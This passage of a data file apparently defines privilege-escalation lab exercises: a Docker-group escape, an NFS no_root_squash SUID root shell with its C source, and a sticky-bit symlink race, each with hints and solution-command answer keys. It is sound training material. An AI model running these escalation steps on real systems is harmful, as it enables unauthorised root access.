          title: 'Chapter 4: Through the Container',
          narrative: `🏆 "The container acted as a portal to the host filesystem. The flag is ours."\n\n  💡 Lesson: The docker group = root. In real environments:\n  - Never add untrusted users to the docker group\n  - Use rootless Docker or Podman\n  - Implement Docker Content Trust\n  - Monitor docker group membership`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag from the mounted filesystem',
        },
      ],
    },
    filesystem: {
      '/etc/group': 'docker:x:999:trainee',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\ntrainee:x:1005:1005::/home/trainee:/bin/bash',
      '/home/trainee/.bash_history': 'id\ndocker images',
      '/home/trainee/docker-lab-notes.txt':
        '# Docker Group Lab\n- Your user (trainee) is in the docker group\n- Docker is installed and the daemon is running\n- You can mount the host filesystem into a container\n- Target: /root/flag.txt on the host\n- Hint: docker run -v /:/mnt --rm -it alpine chroot /mnt <command>',
      '/var/run/docker.sock': '[Docker socket — accessible by docker group]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'id',
      'docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-009',
    title: 'NFS No Root Squash',
    description:
      'An NFS share is exported with no_root_squash, allowing any client to write files as root. Create an SUID binary on the share, mount it, and execute it to gain root.',
    technique: 'NFS no_root_squash',
    difficulty: 'advanced',
    hints: [
      'Check /etc/exports for NFS share configurations.',
      'The share /srv/nfs/data is exported with no_root_squash — the root user on any client is mapped to root on the server.',
      'Create a SUID root binary on the share from the client, then execute it on the server.',
    ],
    story: {
      title: 'The Shared Leak: NFS Trust Abuse',
      chapters: [
        {
          id: 'ch1-exports',
          title: 'Chapter 1: The Exported Shares',
          narrative: `📁 Valkyrie: "NFS shares are common in enterprise environments. Let's check what's exported."\n\n  📋 cat /etc/exports\n\n  NFS (Network File System) allows machines to share directories over the network.\n\n  🗺️ Attack flow:\n  [Client] ──mount──> [NFS Share] ──write SUID──> [Server executes as root]`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'exports' }],
          hint: 'Check exports: cat /etc/exports',
        },
        {
          id: 'ch2-vulnerability',
          title: 'Chapter 2: The Misconfiguration',
          narrative: `🔓 Valkyrie: "no_root_squash is enabled on /srv/nfs/data. This is catastrophic."\n\n  ⚠️ NFS Export Options:\n  ┌─────────────────────────────────────────────────┐\n  │ root_squash    → root on client = nobody (safe)  │\n  │ no_root_squash → root on client = root (!!!)     │\n  └─────────────────────────────────────────────────┘\n\nWith no_root_squash, any client can write a SUID binary as root to the share. When the server executes it, it runs as root!`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'no_root_squash' }],
          hint: 'The share has no_root_squash — root on client = root on server',
        },
        {
          id: 'ch3-exploit',
          title: 'Chapter 3: The SUID Binary',
          narrative: `🔧 Valkyrie: "Write a SUID root binary to the NFS share."\n\n  📋 gcc exploit_template.c -o /srv/nfs/data/rootsh\n  📋 chmod +s /srv/nfs/data/rootsh\n\n  The exploit_template.c contains:\n  #include <unistd.h>\n  int main(void) {\n      setuid(0);\n      setgid(0);\n      system("/bin/bash -p");\n      return 0;\n  }\n\n  ⚡ chmod +s sets the SUID bit — this binary will run as root!`,
          triggers: [{ type: 'command', value: 'gcc' }, { type: 'command', value: 'chmod' }],
          hint: 'Compile and set SUID: gcc exploit_template.c -o /srv/nfs/data/rootsh && chmod +s /srv/nfs/data/rootsh',
        },
        {
          id: 'ch4-root',
          title: 'Chapter 4: The Root Shell',
          narrative: `💀 Valkyrie: "Execute the SUID binary on the server."\n\n  📋 ./rootsh\n\n  The binary runs as root (thanks to SUID + no_root_squash) and spawns a root shell.`,
          triggers: [{ type: 'command', value: './rootsh' }, { type: 'privilege_check', value: 'root' }],
          hint: 'Run the exploit: ./rootsh',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: Root Achieved',
          narrative: `👑 Valkyrie: "Root shell acquired. Read the flag."\n\n  📋 cat /root/flag.txt\n\n  💡 Lesson: NEVER use no_root_squash in production. It completely defeats NFS security. Use root_squash and restrict exports to specific IPs.`,
          triggers: [{ type: 'file_access', value: '/root/flag.txt' }],
          hint: 'Read the flag: cat /root/flag.txt',
        },
      ],
    },
    filesystem: {
      '/etc/exports':
        '# /etc/exports: NFS share configuration\n/srv/nfs/data\t192.168.1.0/24(rw,sync,no_subtree_check,no_root_squash)\n/srv/nfs/public\t192.168.1.0/24(ro,sync,subtree_check,root_squash)',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nnfsuser:x:1006:1006::/home/nfsuser:/bin/bash',
      '/home/nfsuser/nfs-notes.txt':
        '# NFS Lab Notes\n- /etc/exports shows /srv/nfs/data with no_root_squash\n- You have a client at 192.168.1.50 that can write to the share\n- Create a C program that calls setuid(0) then exec(/bin/bash)\n- Compile it on the client, set the SUID bit, then execute it on the server\n- /root/flag.txt is the target',
      '/home/nfsuser/exploit_template.c':
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void) {\n    setuid(0);\n    setgid(0);\n    system("/bin/bash -p");\n    return 0;\n}',
      '/srv/nfs/data': '[NFS share — mounted from client with no_root_squash]',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'cat /etc/exports',
      'mount | grep nfs',
      'gcc exploit_template.c -o /srv/nfs/data/rootsh',
      'chmod +s /srv/nfs/data/rootsh',
      './rootsh',
      'cat /root/flag.txt',
    ],
  },
  {
    id: 'privesc-010',
    title: 'Sticky Bit Race',
    description:
      'A world-writable directory with the sticky bit missing contains a predictable temporary file created by a root-owned cron job. Race against the cron to replace the file with a symlink to /root/flag.txt.',
    technique: 'Sticky Bit Race Condition',
    difficulty: 'advanced',
    hints: [
      'Check /tmp/shared for files with ls -la — the sticky bit is NOT set.',
      'A cron job copies the contents of /tmp/shared/scratch.txt to a root-owned location and processes it.',
      'Replace scratch.txt with a symlink to /root/flag.txt before the cron job runs. The cron job will read the flag contents.',
    ],
    story: {
      title: 'The Race Against the Sweep: Sticky Bit Race Condition',
      chapters: [
        {
          id: 'ch1-permissions',
          title: 'Chapter 1: The Missing Sticky Bit',
          narrative: `🏃 "Time for a race condition. Let's check the shared folder."\n\n  📋 ls -la /tmp/shared/\n\n  ⚠️ Look for: drwxrwxrwx (777) — world-writable, NO sticky bit!\n\n  Sticky bit (1777) prevents users from deleting files they don't own.\n  Without it, ANY user can delete ANY file in the directory.\n\n  ┌─────────────────────────────────────────────────┐\n  │ drwxrwxrwx → anyone can delete any file         │\n  │ drwxrwxrwt → only owner can delete their files  │\n  └─────────────────────────────────────────────────┘`,
          triggers: [{ type: 'command', value: 'ls' }, { type: 'output_contains', value: 'drwxrwxrwx' }],
          hint: 'Check directory permissions: ls -la /tmp/shared/',
        },
        {
          id: 'ch2-cron',
          title: 'Chapter 2: The Predictable Cron',
          narrative: `⏰ "A cron job reads scratch.txt every minute and logs it. The cron runs as root."\n\n  📋 cat /etc/crontab\n\n  * * * * * root cat /tmp/shared/scratch.txt >> /var/log/scratch.log\n\n  Attack plan:\n  1. Delete scratch.txt (we can — no sticky bit!)\n  2. Replace with symlink → /root/flag.txt\n  3. Cron reads our symlink as root\n  4. Flag appears in /var/log/scratch.log`,
          triggers: [{ type: 'command', value: 'cat' }, { type: 'output_contains', value: 'scratch.txt' }],
          hint: 'Check the cron job: cat /etc/crontab',
        },
        {
          id: 'ch3-race',
          title: 'Chapter 3: The Race',
          narrative: `🏁 "The race is on! Replace the file before cron reads it."\n\n  📋 rm -f /tmp/shared/scratch.txt\n  📋 ln -s /root/flag.txt /tmp/shared/scratch.txt\n\n  ⏱️ You have ~60 seconds before cron reads the file.\n\n  ┌─────────────────────────────────────────────────┐\n  │ BEFORE:  /tmp/shared/scratch.txt (normal file) │\n  │ AFTER:   /tmp/shared/scratch.txt → /root/flag   │\n  │                                                 │\n  │ When cron reads scratch.txt, it follows the     │\n  │ symlink and reads /root/flag.txt instead!       │\n  └─────────────────────────────────────────────────┘`,
          triggers: [{ type: 'command', value: 'rm' }, { type: 'command', value: 'ln' }],
          hint: 'Create symlink: rm -f /tmp/shared/scratch.txt && ln -s /root/flag.txt /tmp/shared/scratch.txt',
        },
        {
          id: 'ch4-wait',
          title: 'Chapter 4: Waiting for the Cron',
          narrative: `⏳ "The trap is set. Wait for the cron to trigger."\n\n  📋 sleep 65\n\n  The cron job runs every 60 seconds. Give it a full cycle to ensure it executes.`,
          triggers: [{ type: 'command', value: 'sleep' }],
          hint: 'Wait for cron: sleep 65',
        },
        {
          id: 'ch5-flag',
          title: 'Chapter 5: The Flag in the Log',
          narrative: `🏆 "The cron followed our symlink and leaked the flag into the log."\n\n  📋 cat /var/log/scratch.log\n\n  💡 Lesson: Always set the sticky bit on shared directories! And validate symlink targets before processing files. Race conditions are subtle but devastating.`,
          triggers: [{ type: 'file_access', value: '/var/log/scratch.log' }],
          hint: 'Read the log: cat /var/log/scratch.log',
        },
      ],
    },
    filesystem: {
      '/etc/crontab':
        'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root\tcat /tmp/shared/scratch.txt >> /var/log/scratch.log',
      '/etc/passwd':
        'root:x:0:0:root:/root:/bin/bash\nuser:x:1007:1007::/home/user:/bin/bash',
      '/tmp/shared/scratch.txt': 'default temp data — overwritten by cron',
      '/tmp/shared/': '[world-writable directory — drwxrwxrwx — NO sticky bit]',
      '/var/log/scratch.log': '[cron appends contents of scratch.txt here]',
      '/home/user/race-notes.txt':
        '# Sticky Bit Race Lab\n- /tmp/shared has NO sticky bit — any user can delete any file\n- A cron job reads /tmp/shared/scratch.txt every minute\n- Replace scratch.txt with a symlink to /root/flag.txt\n- Then check /var/log/scratch.log for the flag contents\n- Race condition: delete and recreate before cron reads it',
      '/root/flag.txt': '[flag verified server-side]',
    },
    solutionCommands: [
      'ls -la /tmp/shared/',
      'cat /etc/crontab',
      'rm -f /tmp/shared/scratch.txt && ln -s /root/flag.txt /tmp/shared/scratch.txt',
      'sleep 65',
      'cat /var/log/scratch.log',
    ],
  },
];
